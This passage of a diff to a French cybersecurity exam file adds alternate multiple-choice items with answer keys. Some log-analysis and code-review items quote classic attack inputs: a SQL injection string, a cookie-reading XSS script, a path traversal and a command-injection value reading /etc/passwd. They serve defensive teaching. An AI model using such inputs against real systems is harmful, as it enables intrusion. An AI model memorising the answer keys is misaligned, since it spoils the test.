+   "explanation": "L'échange de clés (ECDHE en TLS 1.3) produit des clés de session ; les données sont chiffrées en symétrique (AES-GCM, ChaCha20), bien plus rapide que l'asymétrique."
+  },
+  {
    "position": 25,
+   "variant_group": "mastere-q25",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Cybersécurité",
    "prompt": "Quelle est la protection la plus efficace contre l'injection SQL ?",
@@ -734,7 +1539,40 @@
    "explanation": "Les requêtes préparées séparent le code SQL des données. Un filtrage côté navigateur se contourne en envoyant la requête directement."
   },
   {
+   "position": 25,
+   "variant_group": "mastere-q25",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Cybersécurité",
+   "prompt": "Quelle est la protection principale contre le XSS dans une application web ?",
+   "options": [
+    {
+     "id": "a",
+     "text": "Utiliser des requêtes SQL préparées"
+    },
+    {
+     "id": "b",
+     "text": "Passer l'ensemble du site en HTTPS"
+    },
+    {
+     "id": "c",
+     "text": "Encoder les données selon le contexte d'affichage"
+    },
+    {
+     "id": "d",
+     "text": "Ajouter un captcha sur chaque formulaire"
+    }
+   ],
+   "correct": [
+    "c"
+   ],
+   "points": 1,
+   "explanation": "Encoder (échapper) les données avant de les insérer dans la page empêche le navigateur de les interpréter comme du code. Une politique CSP vient en complément."
+  },
+  {
    "position": 26,
+   "variant_group": "mastere-q26",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Cybersécurité",
    "prompt": "En quoi consiste une attaque XSS stockée ?",
@@ -763,7 +1601,40 @@
    "explanation": "XSS = exécution de script dans le navigateur de la victime. Forcer une action à l'insu de l'utilisateur correspond au CSRF."
   },
   {
+   "position": 26,
+   "variant_group": "mastere-q26",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Cybersécurité",
+   "prompt": "En quoi consiste une attaque CSRF ?",
+   "options": [
+    {
+     "id": "a",
+     "text": "L'attaquant enregistre un script sur le site, exécuté chez chaque visiteur"
+    },
+    {
+     "id": "b",
+     "text": "L'attaquant lit des fichiers du serveur en remontant l'arborescence"
+    },
+    {
+     "id": "c",
+     "text": "L'attaquant injecte une requête SQL dans un paramètre de l'URL"
+    },
+    {
+     "id": "d",
+     "text": "L'attaquant fait envoyer par la victime connectée une requête à son insu"
+    }
+   ],
+   "correct": [
+    "d"
+   ],
+   "points": 1,
+   "explanation": "Le CSRF exploite la session déjà ouverte de la victime : son navigateur envoie la requête avec ses cookies. On s'en protège par des jetons anti-CSRF et l'attribut SameSite."
+  },
+  {
    "position": 27,
+   "variant_group": "mastere-q27",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Cybersécurité",
    "prompt": "En analyse de risques (EBIOS RM, ISO 27005), le niveau d'un risque s'évalue en croisant :",
@@ -792,7 +1663,40 @@
    "explanation": "Risque = vraisemblance de survenue × gravité des conséquences pour l'organisation."
   },
   {
+   "position": 27,
+   "variant_group": "mastere-q27",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Cybersécurité",
+   "prompt": "Une entreprise souscrit une cyber-assurance pour couvrir un risque identifié dans son analyse. Quelle option de traitement du risque applique-t-elle ?",
+   "options": [
+    {
+     "id": "a",
+     "text": "Le partage (transfert) du risque"
+    },
+    {
+     "id": "b",
+     "text": "La réduction du risque"
+    },
+    {
+     "id": "c",
+     "text": "Le refus (évitement) du risque"
+    },
+    {
+     "id": "d",
+     "text": "L'acceptation (maintien) du risque"
+    }
+   ],
+   "correct": [
+    "a"
+   ],
+   "points": 1,
+   "explanation": "Assurer un risque revient à en transférer tout ou partie des conséquences financières à un tiers. Le risque lui-même n'est pas réduit."
+  },
+  {
    "position": 28,
+   "variant_group": "mastere-q28",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Cybersécurité",
    "prompt": "Quel organisme est l'autorité nationale de cybersécurité en France ?",
@@ -821,7 +1725,40 @@
    "explanation": "L'ANSSI (dont dépend le CERT-FR) est l'autorité nationale. La CNIL protège les données personnelles ; l'ENISA est l'agence européenne."
   },
   {
+   "position": 28,
+   "variant_group": "mastere-q28",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Cybersécurité",
+   "prompt": "En France, à quelle autorité un responsable de traitement doit-il notifier une violation de données personnelles présentant un risque, en principe dans les 72 heures ?",
+   "options": [
+    {
+     "id": "a",
+     "text": "L'ANSSI"
+    },
+    {
+     "id": "b",
+     "text": "La CNIL"
+    },
+    {
+     "id": "c",
+     "text": "L'ARCOM"
+    },
+    {
+     "id": "d",
+     "text": "L'ENISA"
+    }
+   ],
+   "correct": [
+    "b"
+   ],
+   "points": 1,
+   "explanation": "Le RGPD (article 33) impose de notifier l'autorité de contrôle, la CNIL en France, dans les 72 heures. L'ANSSI traite les incidents de sécurité, pas la protection des données."
+  },
+  {
    "position": 29,
+   "variant_group": "mastere-q29",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Cybersécurité",
    "prompt": "Pour les comptes utilisateurs standards, que recommandent aujourd'hui l'ANSSI et le NIST sur le changement périodique obligatoire des mots de passe ?",
@@ -850,7 +1787,40 @@
    "explanation": "Les changements forcés poussent à des mots de passe prévisibles (Été2026!, Automne2026!). On privilégie longueur, MFA et changement sur incident."
   },
   {
+   "position": 29,
+   "variant_group": "mastere-q29",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Cybersécurité",
+   "prompt": "Selon les recommandations actuelles de l'ANSSI et du NIST, quelle mesure renforce le plus la sécurité d'un compte d'administration accessible à distance ?",
+   "options": [
+    {
+     "id": "a",
+     "text": "Imposer un changement de mot de passe chaque mois"
+    },
+    {
+     "id": "b",
+     "text": "Remplacer le mot de passe par un code PIN à 6 chiffres"
+    },
+    {
+     "id": "c",
+     "text": "Activer l'authentification multifacteur sur ce compte"
+    },
+    {
+     "id": "d",
+     "text": "Masquer le nom du compte dans l'écran de connexion"
+    }
+   ],
+   "correct": [
+    "c"
+   ],
+   "points": 1,
+   "explanation": "Le MFA bloque l'usage d'un mot de passe volé ou deviné. Les changements fréquents poussent à des mots de passe prévisibles."
+  },
+  {
    "position": 30,
+   "variant_group": "mastere-q30",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Cybersécurité",
    "prompt": "Que signifie l'approche Zero Trust ?",
@@ -879,7 +1849,40 @@
    "explanation": "Le Zero Trust abandonne l'idée d'un réseau interne de confiance : on vérifie chaque demande d'accès."
   },
   {
+   "position": 30,
+   "variant_group": "mastere-q30",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Cybersécurité",
+   "prompt": "Que signifie le principe du moindre privilège ?",
+   "options": [
+    {
+     "id": "a",
+     "text": "N'accorder à chaque compte que les droits nécessaires à ses tâches"
+    },
+    {
+     "id": "b",
+     "text": "Retirer tous les droits aux utilisateurs qui ne sont pas administrateurs"
+    },
+    {
+     "id": "c",
+     "text": "Donner les mêmes droits à tous pour simplifier l'administration"
+    },
+    {
+     "id": "d",
+     "text": "Accorder les droits d'administration uniquement en dehors des heures ouvrées"
+    }
+   ],
+   "correct": [
+    "a"
+   ],
+   "points": 1,
+   "explanation": "Limiter les droits au strict nécessaire réduit les dégâts possibles en cas d'erreur ou de compromission d'un compte."
+  },
+  {
    "position": 31,
+   "variant_group": "mastere-q31",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Programmation et scripting",
    "prompt": "Qu'affiche ce code Python ?\nports = {\"ssh\": 22, \"http\": 80}\nports[\"https\"] = 443\nprint(len(ports), ports.get(\"ftp\", 21))",
@@ -908,7 +1911,40 @@
    "explanation": "Le dictionnaire contient 3 clés. get() renvoie la valeur par défaut (21) si la clé est absente, sans lever d'erreur."
   },
   {
+   "position": 31,
+   "variant_group": "mastere-q31",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Programmation et scripting",
+   "prompt": "Qu'affiche ce code Python ?\nusers = {\"alice\": \"admin\", \"bob\": \"user\"}\nusers[\"carol\"] = \"user\"\nusers[\"bob\"] = \"admin\"\nprint(len(users), users.get(\"dave\", \"invité\"))",
+   "options": [
+    {
+     "id": "a",
+     "text": "4 invité"
+    },
+    {
+     "id": "b",
+     "text": "3 None"
+    },
+    {
+     "id": "c",
+     "text": "Une erreur KeyError"
+    },
+    {
+     "id": "d",
+     "text": "3 invité"
+    }
+   ],
+   "correct": [
+    "d"
+   ],
+   "points": 1,
+   "explanation": "Affecter une clé existante (bob) remplace sa valeur sans en ajouter : il reste 3 clés. get() renvoie la valeur par défaut si la clé est absente."
+  },
+  {
    "position": 32,
+   "variant_group": "mastere-q32",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Programmation et scripting",
    "prompt": "Qu'affiche ce code Python ?\nip = \"192.168.1.25\"\noctets = ip.split(\".\")\nprint(octets[-1], len(octets))",
@@ -937,7 +1973,40 @@
    "explanation": "split(\".\") donne ['192', '168', '1', '25'] ; l'index -1 désigne le dernier élément."
   },
   {
+   "position": 32,
+   "variant_group": "mastere-q32",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Programmation et scripting",
+   "prompt": "Qu'affiche ce code Python ?\nurl = \"https://intranet.exemple.fr/admin/login\"\nparties = url.split(\"/\")\nprint(parties[2], len(parties))",
+   "options": [
+    {
+     "id": "a",
+     "text": "intranet.exemple.fr 4"
+    },
+    {
+     "id": "b",
+     "text": "intranet.exemple.fr 5"
+    },
+    {
+     "id": "c",
+     "text": "admin 5"
+    },
+    {
+     "id": "d",
+     "text": "admin 4"
+    }
+   ],
+   "correct": [
+    "b"
+   ],
+   "points": 1,
+   "explanation": "split(\"/\") donne ['https:', '', 'intranet.exemple.fr', 'admin', 'login'] : le « // » produit une chaîne vide, d'où 5 éléments."
+  },
+  {
    "position": 33,
+   "variant_group": "mastere-q33",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Programmation et scripting",
    "prompt": "Qu'affiche ce code Python ?\nlogs = [\"OK\", \"FAIL\", \"OK\", \"FAIL\", \"FAIL\"]\nechecs = [l for l in logs if l == \"FAIL\"]\nprint(len(echecs))",
@@ -966,7 +2035,40 @@
    "explanation": "La liste en compréhension ne garde que les éléments égaux à \"FAIL\" ; len() en compte 3."
   },
   {
+   "position": 33,
+   "variant_group": "mastere-q33",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Programmation et scripting",
+   "prompt": "Qu'affiche ce code Python ?\ncodes = [200, 404, 200, 500, 403, 200]\nerreurs = [c for c in codes if c >= 400]\nprint(erreurs[-1], len(erreurs))",
+   "options": [
+    {
+     "id": "a",
+     "text": "500 3"
+    },
+    {
+     "id": "b",
+     "text": "403 2"
+    },
+    {
+     "id": "c",
+     "text": "403 3"
+    },
+    {
+     "id": "d",
+     "text": "200 6"
+    }
+   ],
+   "correct": [
+    "c"
+   ],
+   "points": 1,
+   "explanation": "La compréhension garde 404, 500 et 403 dans l'ordre d'origine : le dernier élément est 403 et la liste en compte 3."
+  },
+  {
    "position": 34,
+   "variant_group": "mastere-q34",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Programmation et scripting",
    "prompt": "Qu'affiche ce code Python ?\ntry:\n    x = int(\"abc\")\n    print(\"A\")\nexcept ValueError:\n    print(\"B\")\nfinally:\n    print(\"C\")",
@@ -995,7 +2097,40 @@
    "explanation": "int(\"abc\") lève une ValueError : print(\"A\") n'est pas atteint, le bloc except s'exécute, puis finally s'exécute toujours."
   },
   {
+   "position": 34,
+   "variant_group": "mastere-q34",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Programmation et scripting",
+   "prompt": "Qu'affiche ce code Python ?\ntry:\n    x = 10 / 0\n    print(\"A\")\nexcept ZeroDivisionError:\n    print(\"B\")\nelse:\n    print(\"C\")\nfinally:\n    print(\"D\")",
+   "options": [
+    {
+     "id": "a",
+     "text": "B puis D"
+    },
+    {
+     "id": "b",
+     "text": "B puis C puis D"
+    },
+    {
+     "id": "c",
+     "text": "A puis C puis D"
+    },
+    {
+     "id": "d",
+     "text": "D"
+    }
+   ],
+   "correct": [
+    "a"
+   ],
+   "points": 1,
+   "explanation": "La division lève ZeroDivisionError : except s'exécute, else est ignoré (il ne tourne que sans exception) et finally s'exécute toujours."
+  },
+  {
    "position": 35,
+   "variant_group": "mastere-q35",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Programmation et scripting",
    "prompt": "Dans un script Bash, que contient la variable $? juste après l'exécution d'une commande ?",
@@ -1024,7 +2159,40 @@
    "explanation": "$? = code de retour ; $$ = PID ; $# = nombre d'arguments ; $0 = nom du script."
   },
   {
+   "position": 35,
+   "variant_group": "mastere-q35",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Programmation et scripting",
+   "prompt": "Dans un script Bash, que contient la variable $1 ?",
+   "options": [
+    {
+     "id": "a",
+     "text": "Le nom du script en cours d'exécution"
+    },
+    {
+     "id": "b",
+     "text": "Le code de retour de la dernière commande"
+    },
+    {
+     "id": "c",
+     "text": "Le nombre d'arguments passés au script"
+    },
+    {
+     "id": "d",
+     "text": "Le premier argument passé au script"
+    }
+   ],
+   "correct": [
+    "d"
+   ],
+   "points": 1,
+   "explanation": "$1 est le premier argument ; $0 est le nom du script, $# le nombre d'arguments et $? le code de retour."
+  },
+  {
    "position": 36,
+   "variant_group": "mastere-q36",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Programmation et scripting",
    "prompt": "Que fait cette commande ?\ncut -d: -f1 /etc/passwd | sort | head -3",
@@ -1053,7 +2221,40 @@
    "explanation": "cut extrait le 1er champ (séparateur « : »), c'est-à-dire le nom du compte ; sort trie ; head -3 garde les 3 premières lignes."
   },
   {
+   "position": 36,
+   "variant_group": "mastere-q36",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Programmation et scripting",
+   "prompt": "Que fait cette commande ?\ngrep \"Failed password\" /var/log/auth.log | wc -l",
+   "options": [
+    {
+     "id": "a",
+     "text": "Elle affiche les mots de passe saisis lors des échecs"
+    },
+    {
+     "id": "b",
+     "text": "Elle compte les lignes du journal contenant « Failed password »"
+    },
+    {
+     "id": "c",
+     "text": "Elle supprime du journal les lignes « Failed password »"
+    },
+    {
+     "id": "d",
+     "text": "Elle compte le nombre total de mots dans le fichier auth.log"
+    }
+   ],
+   "correct": [
+    "b"
+   ],
+   "points": 1,
+   "explanation": "grep garde les lignes contenant le motif et wc -l les compte : on obtient le nombre d'échecs d'authentification enregistrés."
+  },
+  {
    "position": 37,
+   "variant_group": "mastere-q37",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Programmation et scripting",
    "prompt": "On filtre des adresses avec l'expression régulière\n^[0-9]{1,3}(\\.[0-9]{1,3}){3}$\nLaquelle de ces chaînes n'est PAS reconnue ?",
@@ -1082,7 +2283,40 @@
    "explanation": "L'expression exige 4 groupes de 1 à 3 chiffres. Elle vérifie le format, pas les valeurs : 999.999.999.999 est reconnue alors que ce n'est pas une adresse valide."
   },
   {
+   "position": 37,
+   "variant_group": "mastere-q37",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Programmation et scripting",
+   "prompt": "On filtre des adresses électroniques avec l'expression régulière\n^[a-z0-9._-]+@[a-z0-9-]+\\.[a-z]{2,}$\nLaquelle de ces chaînes n'est PAS reconnue ?",
+   "options": [
+    {
+     "id": "a",
+     "text": "jean.dupont@exemple.fr"
+    },
+    {
+     "id": "b",
+     "text": "admin@intranet-rh.com"
+    },
+    {
+     "id": "c",
+     "text": "contact@mail.exemple.fr"
+    },
+    {
+     "id": "d",
+     "text": "s_martin-2@site.io"
+    }
+   ],
+   "correct": [
+    "c"
+   ],
+   "points": 1,
+   "explanation": "Après le @, l'expression n'accepte qu'un seul nom sans point suivi d'une extension : « mail.exemple.fr » contient deux points et échoue."
+  },
+  {
    "position": 38,
+   "variant_group": "mastere-q38",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Programmation et scripting",
    "prompt": "Quel est le problème de ce code Python, si host est saisi par l'utilisateur ?\nsubprocess.run(\"ping -c 1 \" + host, shell=True)",
@@ -1111,7 +2345,40 @@
    "explanation": "Avec shell=True, l'entrée est interprétée par le shell. Il faut passer une liste d'arguments sans shell et valider l'entrée."
   },
   {
+   "position": 38,
+   "variant_group": "mastere-q38",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Programmation et scripting",
+   "prompt": "Quel est le problème de ce code Python, si login est saisi par l'utilisateur ?\ncur.execute(\"SELECT * FROM users WHERE login = '\" + login + \"'\")",
+   "options": [
+    {
+     "id": "a",
+     "text": "Il permet une injection SQL, par exemple avec login = ' OR '1'='1"
+    },
+    {
+     "id": "b",
+     "text": "Il permet une injection de commandes système via le shell"
+    },
+    {
+     "id": "c",
+     "text": "Il provoque un dépassement de tampon si login est trop long"
+    },
+    {
+     "id": "d",
+     "text": "Aucun, car la base de données échappe seule les apostrophes"
+    }
+   ],
+   "correct": [
+    "a"
+   ],
+   "points": 1,
+   "explanation": "La concaténation mêle données et code SQL. Il faut une requête paramétrée (marqueur %s ou ? selon le pilote), sans concaténation."
+  },
+  {
    "position": 39,
+   "variant_group": "mastere-q39",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Programmation et scripting",
    "prompt": "Quel est le risque de ce code C ?\nchar buf[8];\nstrcpy(buf, entree_utilisateur);",
@@ -1140,7 +2407,40 @@
    "explanation": "strcpy ne vérifie pas la taille : une entrée trop longue écrase la mémoire voisine (pile), ce qui peut permettre de détourner l'exécution."
   },
   {
+   "position": 39,
+   "variant_group": "mastere-q39",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Programmation et scripting",
+   "prompt": "Quel est le problème de ce code C ?\nint t[10];\nfor (int i = 0; i <= 10; i++)\n    t[i] = 0;",
+   "options": [
+    {
+     "id": "a",
+     "text": "Une fuite mémoire, car le tableau n'est jamais libéré"
+    },
+    {
+     "id": "b",
+     "text": "Une boucle infinie, car i n'atteint jamais 10"
+    },
+    {
+     "id": "c",
+     "text": "Aucun, le tableau est indexé de 1 à 10"
+    },
+    {
+     "id": "d",
+     "text": "Une écriture hors des limites du tableau quand i vaut 10"
+    }
+   ],
+   "correct": [
+    "d"
+   ],
+   "points": 1,
+   "explanation": "Un tableau de 10 cases est indexé de 0 à 9 : t[10] écrit dans la mémoire voisine, ce qui peut corrompre d'autres données."
+  },
+  {
    "position": 40,
+   "variant_group": "mastere-q40",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Programmation et scripting",
    "prompt": "Un développeur a poussé une clé d'API dans un dépôt Git public, puis l'a supprimée dans le commit suivant. Que faut-il faire ?",
@@ -1169,7 +2469,40 @@
    "explanation": "La clé reste dans l'historique Git et a pu être récupérée par des robots qui surveillent les dépôts publics. Seule la révocation la neutralise."
   },
   {
+   "position": 40,
+   "variant_group": "mastere-q40",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Programmation et scripting",
+   "prompt": "Où une application doit-elle conserver ses secrets (clés d'API, mots de passe de base de données) ?",
+   "options": [
+    {
+     "id": "a",
+     "text": "Dans le code source, encodés en Base64"
+    },
+    {
+     "id": "b",
+     "text": "Dans un gestionnaire de secrets ou injectés au déploiement"
+    },
+    {
+     "id": "c",
+     "text": "Dans un fichier texte à la racine du dépôt Git"
+    },
+    {
+     "id": "d",
+     "text": "Dans un commentaire du fichier de configuration"
+    }
+   ],
+   "correct": [
+    "b"
+   ],
+   "points": 1,
+   "explanation": "Un secret ne doit jamais être versionné. Le Base64 est un simple encodage, réversible par n'importe qui."
+  },
+  {
    "position": 41,
+   "variant_group": "mastere-q41",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Analyse et diagnostic",
    "prompt": "Le journal /var/log/auth.log contient des centaines de lignes en quelques minutes :\nFailed password for invalid user admin from 203.0.113.45 port 51122 ssh2\nFailed password for invalid user test from 203.0.113.45 port 51130 ssh2\nFailed password for root from 203.0.113.45 port 51138 ssh2\nDe quoi s'agit-il ?",
@@ -1198,7 +2531,40 @@
    "explanation": "Une même source teste en rafale des couples identifiant / mot de passe : c'est une force brute. Réponse : bannir l'IP, interdire root, imposer l'authentification par clé."
   },
   {
+   "position": 41,
+   "variant_group": "mastere-q41",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Analyse et diagnostic",
+   "prompt": "Le journal Sécurité d'un serveur Windows contient des centaines d'événements en quelques minutes :\n4625 Échec d'ouverture de session  Compte : Administrateur  Source : 192.0.2.77\n4625 Échec d'ouverture de session  Compte : Administrateur  Source : 192.0.2.77\n4625 Échec d'ouverture de session  Compte : Administrateur  Source : 192.0.2.77\nDe quoi s'agit-il ?",
+   "options": [
+    {
+     "id": "a",
+     "text": "Un scan de ports mené depuis une seule adresse"
+    },
+    {
+     "id": "b",
+     "text": "Une attaque par déni de service sur le serveur"
+    },
+    {
+     "id": "c",
+     "text": "Une attaque par force brute sur le compte Administrateur"
+    },
+    {
+     "id": "d",
+     "text": "Un rançongiciel en cours de chiffrement des fichiers"
+    }
+   ],
+   "correct": [
+    "c"
+   ],
+   "points": 1,
+   "explanation": "L'événement 4625 signale un échec d'ouverture de session : une même source enchaîne les essais sur un compte, c'est une force brute."
+  },
+  {
    "position": 42,
+   "variant_group": "mastere-q42",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Analyse et diagnostic",
    "prompt": "Un journal du serveur web contient la requête suivante :\nGET /produits.php?id=1%27%20OR%20%271%27=%271 HTTP/1.1\" 200\nDe quel type d'attaque s'agit-il ?",
@@ -1227,7 +2593,40 @@
    "explanation": "Décodée, la requête donne id=1' OR '1'='1 : une condition toujours vraie injectée dans la requête SQL. Le code 200 impose de vérifier si elle a abouti."
   },
   {
+   "position": 42,
+   "variant_group": "mastere-q42",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Analyse et diagnostic",
+   "prompt": "Un journal du serveur web contient la requête suivante :\nGET /recherche?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E HTTP/1.1\" 200\nDe quel type d'attaque s'agit-il ?",
+   "options": [
+    {
+     "id": "a",
+     "text": "Une tentative de XSS"
+    },
+    {
+     "id": "b",
+     "text": "Une injection SQL"
+    },
+    {
+     "id": "c",
+     "text": "Une traversée de répertoire"
+    },
+    {
+     "id": "d",
+     "text": "Une attaque par force brute"
+    }
+   ],
+   "correct": [
+    "a"
+   ],
+   "points": 1,
+   "explanation": "Décodée, la requête donne <script>alert(document.cookie)</script> : l'attaquant teste si le paramètre est renvoyé dans la page sans encodage."
+  },
+  {
    "position": 43,
+   "variant_group": "mastere-q43",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Analyse et diagnostic",
    "prompt": "Un journal du serveur web contient la requête suivante :\nGET /download.php?file=../../../../etc/passwd\nDe quel type d'attaque s'agit-il ?",
@@ -1256,7 +2655,40 @@
    "explanation": "Les « ../ » servent à remonter l'arborescence pour lire un fichier hors du dossier prévu."
   },
   {
+   "position": 43,
+   "variant_group": "mastere-q43",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Analyse et diagnostic",
+   "prompt": "Un journal du serveur web contient la requête suivante :\nGET /ping.php?host=127.0.0.1%3Bcat%20%2Fetc%2Fpasswd\nDe quel type d'attaque s'agit-il ?",
+   "options": [
+    {
+     "id": "a",
+     "text": "Une traversée de répertoire (path traversal)"
+    },
+    {
+     "id": "b",
+     "text": "Une attaque XSS (cross-site scripting)"
+    },
+    {
+     "id": "c",
+     "text": "Une injection SQL (SQL injection)"
+    },
+    {
+     "id": "d",
+     "text": "Une injection de commandes (command injection)"
+    }
+   ],
+   "correct": [
+    "d"
+   ],
+   "points": 1,
+   "explanation": "Décodée, la requête donne host=127.0.0.1;cat /etc/passwd : le « ; » enchaîne une seconde commande système après le ping."
+  },
+  {
    "position": 44,
+   "variant_group": "mastere-q44",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Analyse et diagnostic",
    "prompt": "Dans le cycle classique de réponse à incident, quelle phase suit la détection et l'analyse ?",
@@ -1285,7 +2717,40 @@
    "explanation": "Cycle décrit dans le NIST SP 800-61 (rév. 2) et repris par la plupart des méthodes : préparation, détection et analyse, confinement, éradication et remise en service, retour d'expérience. La rév. 3 (2025) réorganise ces étapes selon les fonctions du NIST CSF 2.0."
   },
   {
+   "position": 44,
+   "variant_group": "mastere-q44",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Analyse et diagnostic",
+   "prompt": "Dans le cycle de réponse à incident décrit par le NIST SP 800-61 (rév. 2), quelle est la dernière phase ?",
+   "options": [
+    {
+     "id": "a",
+     "text": "Le confinement, l'éradication et la remise en service"
+    },
+    {
+     "id": "b",
+     "text": "L'activité post-incident (retour d'expérience)"
+    },
+    {
+     "id": "c",
+     "text": "La détection et l'analyse de l'incident"
+    },
+    {
+     "id": "d",
+     "text": "La préparation des équipes et des outils"
+    }
+   ],
+   "correct": [
+    "b"
+   ],
+   "points": 1,
+   "explanation": "Les phases sont : préparation, détection et analyse, confinement, éradication et remise en service, puis activité post-incident, qui alimente une nouvelle préparation."
+  },
+  {
    "position": 45,
+   "variant_group": "mastere-q45",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Analyse et diagnostic",
    "prompt": "Une machine compromise est encore allumée. Que collectez-vous en premier pour l'investigation ?",
@@ -1314,7 +2779,40 @@
    "explanation": "On collecte de la donnée la plus volatile à la moins volatile (RFC 3227). La mémoire vive disparaît à l'extinction."
   },
   {
+   "position": 45,
+   "variant_group": "mastere-q45",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Analyse et diagnostic",
+   "prompt": "Lors d'une investigation sur une machine compromise encore allumée, lequel de ces éléments collectez-vous en dernier ?",
+   "options": [
+    {
+     "id": "a",
+     "text": "Le cache ARP de la machine"
+    },
+    {
+     "id": "b",
+     "text": "La liste des processus en cours"
+    },
+    {
+     "id": "c",
+     "text": "Les sauvegardes archivées sur bande"
+    },
+    {
+     "id": "d",
+     "text": "Le contenu de la mémoire vive"
+    }
+   ],
+   "correct": [
+    "c"
+   ],
+   "points": 1,
+   "explanation": "On collecte du plus volatil au moins volatil (RFC 3227). Les supports d'archive ne changent pas à l'extinction de la machine."
+  },
+  {
    "position": 46,
+   "variant_group": "mastere-q46",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Analyse et diagnostic",
    "prompt": "Un poste affiche une demande de rançon et chiffre des fichiers sur un partage réseau. Quelle est votre première action ?",
@@ -1343,7 +2841,40 @@
    "explanation": "Isoler stoppe la propagation ; ne pas éteindre préserve la mémoire pour l'analyse (recommandation ANSSI). Restaurer avant d'avoir stoppé l'attaque fait chiffrer à nouveau."
   },
   {
+   "position": 46,
+   "variant_group": "mastere-q46",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Analyse et diagnostic",
+   "prompt": "Un utilisateur signale avoir saisi son mot de passe de messagerie sur une fausse page après avoir cliqué sur un lien d'hameçonnage. Quelle est votre première action ?",
+   "options": [
+    {
+     "id": "a",
+     "text": "Réinitialiser son mot de passe et révoquer ses sessions ouvertes"
+    },
+    {
+     "id": "b",
+     "text": "Supprimer le message d'hameçonnage de sa boîte de réception"
+    },
+    {
+     "id": "c",
+     "text": "Réinstaller entièrement son poste de travail par précaution"
+    },
+    {
+     "id": "d",
+     "text": "Surveiller son compte quelques jours avant de décider quoi faire"
+    }
+   ],
+   "correct": [
+    "a"
+   ],
+   "points": 1,
+   "explanation": "Le mot de passe est à considérer comme compromis : il faut couper l'accès de l'attaquant avant toute autre action, puis vérifier les règles de transfert et les connexions."
+  },
+  {
    "position": 47,
+   "variant_group": "mastere-q47",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Analyse et diagnostic",
    "prompt": "Un scan nmap d'un serveur web exposé à Internet donne :\n22/tcp   open      ssh\n80/tcp   open      http\n3306/tcp open      mysql\n3389/tcp filtered  ms-wbt-server\nQuel point est le plus préoccupant ?",
@@ -1372,7 +2903,40 @@
    "explanation": "Une base de données ne doit jamais être exposée directement : elle doit n'être joignable que par l'application. SSH exposé mérite aussi d'être restreint, mais le risque est moindre."
   },
   {
+   "position": 47,
+   "variant_group": "mastere-q47",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Analyse et diagnostic",
+   "prompt": "Un scan nmap d'un serveur de messagerie exposé à Internet donne :\n25/tcp   open      smtp\n443/tcp  open      https\n445/tcp  open      microsoft-ds\n3389/tcp filtered  ms-wbt-server\nQuel point est le plus préoccupant ?",
+   "options": [
+    {
+     "id": "a",
+     "text": "Le service SMTP (25) est accessible depuis Internet"
+    },
+    {
+     "id": "b",
+     "text": "Le service HTTPS (443) est accessible depuis Internet"
+    },
+    {
+     "id": "c",
+     "text": "Le port RDP (3389) est filtré par un pare-feu"
+    },
+    {
+     "id": "d",
+     "text": "Le partage SMB (445) est accessible depuis Internet"
+    }
+   ],
+   "correct": [
+    "d"
+   ],
+   "points": 1,
+   "explanation": "SMTP et HTTPS sont attendus sur un serveur de messagerie. SMB ne doit jamais être exposé à Internet : il a servi à des attaques massives comme WannaCry."
+  },
+  {
    "position": 48,
+   "variant_group": "mastere-q48",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Analyse et diagnostic",
    "prompt": "Trois vulnérabilités sont signalées :\n1. CVSS 9.8 sur un serveur interne isolé, sans données sensibles\n2. CVSS 7.5 activement exploitée, sur le VPN exposé à Internet\n3. CVSS 5.3 sur un poste de test\nLaquelle corrigez-vous en premier ?",
@@ -1401,7 +2965,40 @@
    "explanation": "Le score CVSS seul ne suffit pas : l'exposition et l'exploitation active rendent la n° 2 la plus urgente."
   },
   {
+   "position": 48,
+   "variant_group": "mastere-q48",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Analyse et diagnostic",
